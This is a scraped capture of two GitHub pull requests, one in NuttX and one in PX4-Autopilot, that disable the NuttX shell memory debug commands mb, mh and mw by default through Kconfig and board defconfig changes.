    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fapache%2Fnuttx-apps%2Fpull%2F647%2Fcommits%2F2fc1157f8585acc39f13a31612ebf890f41e76ca)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fpull_requests%2Fshow%2Fcommits&source=header-repo&source_repo=apache%2Fnuttx-apps)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[apache](/apache)
/
**[nuttx-apps](/apache/nuttx-apps)**
Public

* [Notifications](/login?return_to=%2Fapache%2Fnuttx-apps) You must be signed in to change notification settings
* [Fork
  568](/login?return_to=%2Fapache%2Fnuttx-apps)
* [Star
   310](/login?return_to=%2Fapache%2Fnuttx-apps)

* [Code](/apache/nuttx-apps)
* [Issues
  45](/apache/nuttx-apps/issues)
* [Pull requests
  11](/apache/nuttx-apps/pulls)
* [Actions](/apache/nuttx-apps/actions)
* [Projects
  0](/apache/nuttx-apps/projects)
* [Security](/apache/nuttx-apps/security)
* [Insights](/apache/nuttx-apps/pulse)

Additional navigation options

* [Code](/apache/nuttx-apps)
* [Issues](/apache/nuttx-apps/issues)
* [Pull requests](/apache/nuttx-apps/pulls)
* [Actions](/apache/nuttx-apps/actions)
* [Projects](/apache/nuttx-apps/projects)
* [Security](/apache/nuttx-apps/security)
* [Insights](/apache/nuttx-apps/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fapache%2Fnuttx-apps%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fapache%2Fnuttx-apps%2Fissues%2Fnew%2Fchoose)
to your account

# nshlib: Disable mb, mh, and mw by default #647

 Merged

[xiaoxiang781216](/xiaoxiang781216)
merged 1 commit into
[apache:master](/apache/nuttx-apps/tree/master "apache/nuttx-apps:master")
from
swkim101:master

Apr 3, 2021

[Conversation
8](/apache/nuttx-apps/pull/647)
[Commits
1](/apache/nuttx-apps/pull/647/commits)
[Checks
0](/apache/nuttx-apps/pull/647/checks)
[Files changed](/apache/nuttx-apps/pull/647/files)

 Merged

# [nshlib: Disable mb, mh, and mw by default](#top) #647

 Changes from **all commits**

Commits

[Show all changes

1 commit](/apache/nuttx-apps/pull/647/files)
Select commit

[`2fc1157`
nshlib: Disable mb, mh, and mw by default

swkim101 Apr 3, 2021](/apache/nuttx-apps/pull/647/commits/2fc1157f8585acc39f13a31612ebf890f41e76ca)

**File filter**

### Filter by extension

Filter by extension

No extension
(1)

All 1 file type selected

---

Viewed files

[Clear filters](/apache/nuttx-apps/pull/647/commits/2fc1157f8585acc39f13a31612ebf890f41e76ca)

 **Conversations**

Failed to load comments.  Retry

 Loading

 **Jump to**

Jump to file

Failed to load files.  Retry

 Loading

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Show whitespace

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

nshlib: Disable mb, mh, and mw by default

```
- Fix [apache/nuttx#3011](https://github.com/apache/nuttx/issues/3011)

Co-authored-by: Gisu Yeo <wcharcode@gmail.com>
Co-authored-by: Taegyu Kim <tgkim@purdue.edu>
```

* Loading branch information

[![@swkim101](https://avatars.githubusercontent.com/u/72803908?s=40&v=4)](/swkim101) [![@GisuYeo](https://avatars.githubusercontent.com/u/33445425?s=40&v=4)](/GisuYeo) [![@ktskt](https://avatars.githubusercontent.com/u/45827896?s=40&v=4)](/ktskt)

3 people

committed
Apr 3, 2021

commit 2fc1157f8585acc39f13a31612ebf890f41e76ca

## There are no files selected for viewing

6 changes: 3 additions & 3 deletions

6
[nshlib/Kconfig](#diff-db678cbb3e1ee7ce9282fc5e697f533c7f50c8aee4a4fd84871eb66fff54e19e "nshlib/Kconfig")

Show comments

[View file](/apache/nuttx-apps/blob/2fc1157f8585acc39f13a31612ebf890f41e76ca/nshlib/Kconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -365,7 +365,7 @@ config NSH\_DISABLE\_LS |
|  |  |  |
|  |  | config NSH\_DISABLE\_MB |
|  |  | bool "Disable mb" |
|  |  | default n |
|  |  | default y |
|  |  |  |
|  |  | config NSH\_DISABLE\_MD5 |
|  |  | bool "Disable md5" |
| Expand Down  Expand Up | | @@ -402,7 +402,7 @@ config NSH\_DISABLE\_MKSMARTFS |
|  |  |  |
|  |  | config NSH\_DISABLE\_MH |
|  |  | bool "Disable mh" |
|  |  | default n |
|  |  | default y |
|  |  |  |
|  |  | config NSH\_DISABLE\_MODCMDS |
|  |  | bool "Disable modules commands (insmod, rmmod, lsmod)" |
| Expand All | | @@ -419,7 +419,7 @@ config NSH\_DISABLE\_MV |
|  |  |  |
|  |  | config NSH\_DISABLE\_MW |
|  |  | bool "Disable mw" |
|  |  | default n |
|  |  | default y |
|  |  |  |
|  |  | config NSH\_DISABLE\_NSFMOUNT |
|  |  | bool "Disable nfsmount" |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_7c2fa8c0_20250114_204337.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPX4%2FPX4-Autopilot%2Fpull%2F17264%2Fcommits%2F555f900cf52c0057e4c429ff3699c91911a21cab)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPX4%2FPX4-Autopilot%2Fpull%2F17264%2Fcommits%2F555f900cf52c0057e4c429ff3699c91911a21cab)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fpull_requests%2Fshow%2Fcommits&source=header-repo&source_repo=PX4%2FPX4-Autopilot)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PX4](/PX4)
/
**[PX4-Autopilot](/PX4/PX4-Autopilot)**
Public

* [Notifications](/login?return_to=%2FPX4%2FPX4-Autopilot) You must be signed in to change notification settings
* [Fork
  13.6k](/login?return_to=%2FPX4%2FPX4-Autopilot)
* [Star
   8.8k](/login?return_to=%2FPX4%2FPX4-Autopilot)

* [Code](/PX4/PX4-Autopilot)
* [Issues
  1.4k](/PX4/PX4-Autopilot/issues)
* [Pull requests
  535](/PX4/PX4-Autopilot/pulls)
* [Actions](/PX4/PX4-Autopilot/actions)
* [Projects
  0](/PX4/PX4-Autopilot/projects)
* [Security](/PX4/PX4-Autopilot/security)
* [Insights](/PX4/PX4-Autopilot/pulse)

Additional navigation options

* [Code](/PX4/PX4-Autopilot)
* [Issues](/PX4/PX4-Autopilot/issues)
* [Pull requests](/PX4/PX4-Autopilot/pulls)
* [Actions](/PX4/PX4-Autopilot/actions)
* [Projects](/PX4/PX4-Autopilot/projects)
* [Security](/PX4/PX4-Autopilot/security)
* [Insights](/PX4/PX4-Autopilot/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FPX4%2FPX4-Autopilot%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FPX4%2FPX4-Autopilot%2Fissues%2Fnew%2Fchoose)
to your account

# boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by default #17264

 Merged

[dagar](/dagar)
merged 1 commit into
[master](/PX4/PX4-Autopilot/tree/master "PX4/PX4-Autopilot:master")
from
[pr\_boards\_nuttx\_debug\_commands\_default](/PX4/PX4-Autopilot/tree/pr_boards_nuttx_debug_commands_default "PX4/PX4-Autopilot:pr_boards_nuttx_debug_commands_default")

Mar 30, 2021

[Conversation
1](/PX4/PX4-Autopilot/pull/17264)
[Commits
1](/PX4/PX4-Autopilot/pull/17264/commits)
[Checks
0](/PX4/PX4-Autopilot/pull/17264/checks)
[Files changed](/PX4/PX4-Autopilot/pull/17264/files)

 Merged

# [boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by default](#top) #17264

 Show file tree

 Hide file tree

 Changes from **all commits**

Commits

[Show all changes

1 commit](/PX4/PX4-Autopilot/pull/17264/files)
Select commit

[`555f900`
boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by d…

dagar Mar 29, 2021](/PX4/PX4-Autopilot/pull/17264/commits/555f900cf52c0057e4c429ff3699c91911a21cab)

**File filter**

### Filter by extension

Filter by extension

No extension
(44)

All 1 file type selected

---

Viewed files

[Clear filters](/PX4/PX4-Autopilot/pull/17264/commits/555f900cf52c0057e4c429ff3699c91911a21cab)

 **Conversations**

Failed to load comments.  Retry

 Loading

 **Jump to**

Jump to file

Failed to load files.  Retry

 Loading

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

Show whitespace

##### Diff view

![Unified Diff View](https://github.githubassets.com/assets/unified-6de447b07fd7.svg)

Unified

![Split Diff View](https://github.githubassets.com/assets/split-b930d4a1df45.svg)

Split

Hide whitespace

 Apply and reload

* boards

  + airmind/mindpx-v2/nuttx-config/nsh

    - boards/airmind/mindpx-v2/nuttx-config/nsh/defconfig
      [defconfig](#diff-9ece1b10e2220877a1768a58c56bcfd7daf4a2bc9e16fd073a48a597f67e7b4a)
  + ark/can-flow/nuttx-config/nsh

    - boards/ark/can-flow/nuttx-config/nsh/defconfig
      [defconfig](#diff-7662fdce2264bf180adbb70a48c7073a42d2d3cebb7235ba912c685e59e43c44)
  + av/x-v1/nuttx-config/nsh

    - boards/av/x-v1/nuttx-config/nsh/defconfig
      [defconfig](#diff-144ed788184c3c32afaaaa4f750de7833afeaf1f82f12ac5295e2664514033c8)
  + bitcraze

    - crazyflie/nuttx-config/nsh

      * boards/bitcraze/crazyflie/nuttx-config/nsh/defconfig
        [defconfig](#diff-c99ec9fae75bb13e8248556a051f2158a332fd1bd8a9e9505673ff2e002e1bd0)
    - crazyflie21/nuttx-config/nsh

      * boards/bitcraze/crazyflie21/nuttx-config/nsh/defconfig
        [defconfig](#diff-460630cea98107c51d337b04d5b498223cbad9218fc4e9c80e791283072a8444)
  + cuav

    - can-gps-v1/nuttx-config/nsh

      * boards/cuav/can-gps-v1/nuttx-config/nsh/defconfig
        [defconfig](#diff-5dedfc875937a58f9df0c95c195ec12626a2fc3c265f4f8c358625bdda8391d3)
    - nora/nuttx-config/nsh

      * boards/cuav/nora/nuttx-config/nsh/defconfig
        [defconfig](#diff-b72989161da426d15749f82fe38d2c5be8ae0fe8bd42f3d45d4e11821b9d74f3)
    - x7pro/nuttx-config/nsh

      * boards/cuav/x7pro/nuttx-config/nsh/defconfig
        [defconfig](#diff-5d5f4fa8cff5fa69a1c70a5b84b185f6001460559ef9f5cf376548838a311d5a)
  + cubepilot

    - cubeorange/nuttx-config

      * console

        + boards/cubepilot/cubeorange/nuttx-config/console/defconfig
          [defconfig](#diff-027457ff3a8aeb84ea3b4891fbf3ab68d0c8cd3835b4cbe910434e662bc1a4c3)
      * nsh

        + boards/cubepilot/cubeorange/nuttx-config/nsh/defconfig
          [defconfig](#diff-30457126b7612ef4d5e2236ad929823d1974d0bb7e304cd77116135c1c15737e)
    - cubeyellow/nuttx-config

      * console

        + boards/cubepilot/cubeyellow/nuttx-config/console/defconfig
          [defconfig](#diff-003c0ee9f7ea1a7defb720f8d676d876ef193870868902fa391c5dc192e14a2b)
      * nsh

        + boards/cubepilot/cubeyellow/nuttx-config/nsh/defconfig
          [defconfig](#diff-4017c0d84fe3b40c0c6cf55f94beec759c3b717910af39575b4b267afc527e58)
  + holybro

    - can-gps-v1/nuttx-config/nsh

      * boards/holybro/can-gps-v1/nuttx-config/nsh/defconfig
        [defconfig](#diff-87a251812830ca7aa3b3d3d19f849029143caa2ef347ea9fe5434b7fc39babaf)
    - durandal-v1/nuttx-config/nsh

      * boards/holybro/durandal-v1/nuttx-config/nsh/defconfig
        [defconfig](#diff-f0dba8efb5733fe8835f535d1d349b711482007bf5271c52f87870531bc8f0c5)
    - kakutef7/nuttx-config/nsh

      * boards/holybro/kakutef7/nuttx-config/nsh/defconfig
        [defconfig](#diff-16ad9b988c04376612b48da79d29158283fe826e810be171e852a684a5059890)
    - pix32v5/nuttx-config/nsh

      * boards/holybro/pix32v5/nuttx-config/nsh/defconfig
        [defconfig](#diff-20de51f4060dac65d510453da53195f63b2f7d9be1b2a43f0c17ee2fc4b56112)
  + modalai/fc-v1/nuttx-config/nsh

    - boards/modalai/fc-v1/nuttx-config/nsh/defconfig
      [defconfig](#diff-577d7abf45925573da05b18d277224f63c332e7e4b721e08d6bb26a9334bc392)
  + mro

    - ctrl-zero-f7-oem/nuttx-config/nsh

      * boards/mro/ctrl-zero-f7-oem/nuttx-config/nsh/defconfig
        [defconfig](#diff-6022c19cc57613823a4db516321f1631fe5333b8ed37c26e90d5d100673255d2)
    - ctrl-zero-f7/nuttx-config/nsh

      * boards/mro/ctrl-zero-f7/nuttx-config/nsh/defconfig
        [defconfig](#diff-237900f42dfc417bcd89c00ce313dd61f6d77b8068ab3618bcf11949d7c266ab)
    - ctrl-zero-h7-oem/nuttx-config/nsh

      * boards/mro/ctrl-zero-h7-oem/nuttx-config/nsh/defconfig
        [defconfig](#diff-b3378a1588b82b3431a950db40ff71f487a4437168893fae47ccee2defd273f5)
    - ctrl-zero-h7/nuttx-config/nsh

      * boards/mro/ctrl-zero-h7/nuttx-config/nsh/defconfig
        [defconfig](#diff-518b7d0878ad0973de931d6d2a6a52b1ab842604016034977f0fe80ea1b2cab3)
    - pixracerpro/nuttx-config/nsh

      * boards/mro/pixracerpro/nuttx-config/nsh/defconfig
        [defconfig](#diff-bac9a246872340675afacaff22a4dfe692a81c7251f1f12cca8095ab3757243b)
    - x21-777/nuttx-config/nsh

      * boards/mro/x21-777/nuttx-config/nsh/defconfig
        [defconfig](#diff-52a1f498a7a0b1e14560a4dde06d33e68ae884401201f0828b866533d3c51274)
    - x21/nuttx-config/nsh

      * boards/mro/x21/nuttx-config/nsh/defconfig
        [defconfig](#diff-66328b747dda7c3db05874107fd740babdcb519456a61e0ef8a4ae44a20697a8)
  + nxp

    - fmuk66-e/nuttx-config

      * nsh

        + boards/nxp/fmuk66-e/nuttx-config/nsh/defconfig
          [defconfig](#diff-9f5a79694be5a64fd4caef5278f47f4f044eeefbabeb9ea2616fa80ef87246ec)
      * socketcan

        + boards/nxp/fmuk66-e/nuttx-config/socketcan/defconfig
          [defconfig](#diff-a92e949b98323270305480b1190d737e238a8b3ed7d6e07da05b72ed388f5568)
    - fmuk66-v3/nuttx-config

      * nsh

        + boards/nxp/fmuk66-v3/nuttx-config/nsh/defconfig
          [defconfig](#diff-765841fe678ca481c4034b5b50e159304a9e06ff713906bf0387804829fe0df0)
      * socketcan

        + boards/nxp/fmuk66-v3/nuttx-config/socketcan/defconfig
          [defconfig](#diff-a445b2e9612c1b2478a3faf8adbc170432b5fbcbb0d03df26250c81986e29aa8)
  + omnibus/f4sd/nuttx-config/nsh

    - boards/omnibus/f4sd/nuttx-config/nsh/defconfig
      [defconfig](#diff-a462c2f9c0e4ad1ed2255cd1c9ff33638c6dbc8bc2213e82185a9d2fe84c6a96)
  + px4

    - fmu-v2/nuttx-config/nsh

      * boards/px4/fmu-v2/nuttx-config/nsh/defconfig
        [defconfig](#diff-75391be2d68abab743e66dc4c3a72ffafa2f38ed89b33b31bd65fcda6185d965)
    - fmu-v3/nuttx-config/nsh

      * boards/px4/fmu-v3/nuttx-config/nsh/defconfig
        [defconfig](#diff-1ebd550e4d55222a0abd3d8e92530dd0594de2fbb70a88a6a2c971b9911f73c7)
    - fmu-v4/nuttx-config/nsh

      * boards/px4/fmu-v4/nuttx-config/nsh/defconfig
        [defconfig](#diff-62cd86817e4c6200d07adb435c993f4390bc210e71d6cef72bb6105ecfce3a25)
    - fmu-v4pro/nuttx-config/nsh

      * boards/px4/fmu-v4pro/nuttx-config/nsh/defconfig
        [defconfig](#diff-e7c372de306dda588c08f347d8096f77c108779e01c9a14141e069cce0aa114f)
    - fmu-v5/nuttx-config

      * debug

        + boards/px4/fmu-v5/nuttx-config/debug/defconfig
          [defconfig](#diff-591e80652067fff88bf03bc9644d8fcca9a369441da6a80acb9e8eb176aeb05e)
      * nsh

        + boards/px4/fmu-v5/nuttx-config/nsh/defconfig
          [defconfig](#diff-ece25f8407d956c983b8998926fff6e432d6165acf23a1d6e4e358eb0179e807)
      * optimized

        + boards/px4/fmu-v5/nuttx-config/optimized/defconfig
          [defconfig](#diff-8e66c8ce677a02864e738368cdba9b54266bcd3864b947fc84ffad6e7c4d752f)
      * stackcheck

        + boards/px4/fmu-v5/nuttx-config/stackcheck/defconfig
          [defconfig](#diff-da3e33e2335a2878e37d31e97d8f87b14981b201da57a1e0ffea97cb2259db47)
      * uavcanv1

        + boards/px4/fmu-v5/nuttx-config/uavcanv1/defconfig
          [defconfig](#diff-320d6d5441176456ba673fc9dd777654fc37d83c907fb69409b8ba1be0f413ea)
    - fmu-v5x/nuttx-config

      * base\_phy\_DP83848C

        + boards/px4/fmu-v5x/nuttx-config/base\_phy\_DP83848C/defconfig
          [defconfig](#diff-0205edc9dda340c12c172b070b0769e958d33b35ee49a343d91435729fbf9246)
      * nsh

        + boards/px4/fmu-v5x/nuttx-config/nsh/defconfig
          [defconfig](#diff-c089b25f51ae641d36edeb322d51850a8b57f0ddd27279c5bbe8afd628335171)
    - fmu-v6u/nuttx-config/nsh

      * boards/px4/fmu-v6u/nuttx-config/nsh/defconfig
        [defconfig](#diff-3bfa2588f363eb2ffbf4322c298e2270d8b0164b67a77dd4b99beaef92de6e4a)
    - fmu-v6x/nuttx-config/nsh

      * boards/px4/fmu-v6x/nuttx-config/nsh/defconfig
        [defconfig](#diff-a828949b4ef7b9b7af0c7a79e104d92abe7458b5a269dbb177aec07b89b8e6f9)
  + spracing/h7extreme/nuttx-config/nsh

    - boards/spracing/h7extreme/nuttx-config/nsh/defconfig
      [defconfig](#diff-be6ab114a9d0f070c635ebcd064c24c89336f587c81d1d65753fbde7ffb0b5a4)
  + uvify/core/nuttx-config/nsh

    - boards/uvify/core/nuttx-config/nsh/defconfig
      [defconfig](#diff-6b50c223adaee02495c3273c6fc57515aa16f1aa28462ffdcba4520a55979c6b)

boards: NuttX disable all NSH memory debug commands (mb, mh, mw) by d…

```
…efault

 - closes [#17062](https://github.com/PX4/PX4-Autopilot/issues/17062)
```

* Loading branch information

[![@dagar](https://avatars.githubusercontent.com/u/84712?s=40&v=4)](/dagar)

[dagar](/PX4/PX4-Autopilot/commits?author=dagar "View all commits by dagar")
committed
Mar 29, 2021

commit 555f900cf52c0057e4c429ff3699c91911a21cab

## There are no files selected for viewing

1 change: 1 addition & 0 deletions

1
[boards/airmind/mindpx-v2/nuttx-config/nsh/defconfig](#diff-9ece1b10e2220877a1768a58c56bcfd7daf4a2bc9e16fd073a48a597f67e7b4a "boards/airmind/mindpx-v2/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/airmind/mindpx-v2/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -101,6 +101,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/ark/can-flow/nuttx-config/nsh/defconfig](#diff-7662fdce2264bf180adbb70a48c7073a42d2d3cebb7235ba912c685e59e43c44 "boards/ark/can-flow/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/ark/can-flow/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -81,6 +81,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/av/x-v1/nuttx-config/nsh/defconfig](#diff-144ed788184c3c32afaaaa4f750de7833afeaf1f82f12ac5295e2664514033c8 "boards/av/x-v1/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/av/x-v1/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -132,6 +132,7 @@ CONFIG\_NSH\_CMDPARMS=y |
|  |  | CONFIG\_NSH\_CROMFSETC=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_LINELEN=128 |
|  |  | CONFIG\_NSH\_MAXARGUMENTS=15 |
|  |  | CONFIG\_NSH\_NESTDEPTH=8 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/bitcraze/crazyflie/nuttx-config/nsh/defconfig](#diff-c99ec9fae75bb13e8248556a051f2158a332fd1bd8a9e9505673ff2e002e1bd0 "boards/bitcraze/crazyflie/nuttx-config/nsh/defconfig")

Show comments

[View file](/PX4/PX4-Autopilot/blob/555f900cf52c0057e4c429ff3699c91911a21cab/boards/bitcraze/crazyflie/nuttx-config/nsh/defconfig)
Edit file

Delete file

[Open in desktop](https://desktop.github.com)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -97,6 +97,7 @@ CONFIG\_NSH\_DISABLE\_IFCONFIG=y |
|  |  | CONFIG\_NSH\_DISABLE\_IFUPDOWN=y |
|  |  | CONFIG\_NSH\_DISABLE\_MB=y |
|  |  | CONFIG\_NSH\_DISABLE\_MH=y |
|  |  | CONFIG\_NSH\_DISABLE\_MW=y |
|  |  | CONFIG\_NSH\_DISABLE\_TELNETD=y |
|  |  | CONFIG\_NSH\_FATDEVNO=0 |
|  |  | CONFIG\_NSH\_LINELEN=128 |
| Expand Down | |  |

1 change: 1 addition & 0 deletions

1
[boards/bitcraze/crazyflie21/nuttx-config/nsh/defconfig](#diff-460630cea98107c51d337b04d5b498223cbad9218fc4e9c80e791283072a8444 "boards/bitcraze/crazyflie21/nuttx-config/nsh/defconfig")

Show comments

